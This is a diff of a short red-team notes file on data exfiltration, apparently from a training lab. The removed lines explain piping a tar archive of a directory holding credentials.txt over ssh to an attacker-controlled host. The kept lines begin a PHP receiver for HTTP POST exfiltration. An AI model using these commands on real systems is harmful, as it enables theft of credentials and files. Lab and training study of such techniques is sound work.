@@ -1,14 +1,5 @@
 Windows Data Exfiltration techniques using CMD for Red Team Operations
 
-Exfiltration using SSH:
-cat task/credentials.txt                Sensitive data to be exfiltrated
-tar cf - task/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -" 
-                                        An attacker needs to control a server, which in this case has an SSH server enabled, to receive the exfiltrated data
-                                        The `tar` command to create an archive file of the `task` directory
-                                        Then pass the archived file over the ssh. SSH clients provide a way to execute a single command without having a full session.
-                                        Then pass the command that must be executed in double quotations, `"cd /tmp/; tar xpf`. In this case, we change the directory 
-                                        and unarchive the passed file
-
 HTTP POST Request Data Exfiltration:
 <?php 
 if (isset($_POST['file'])) {
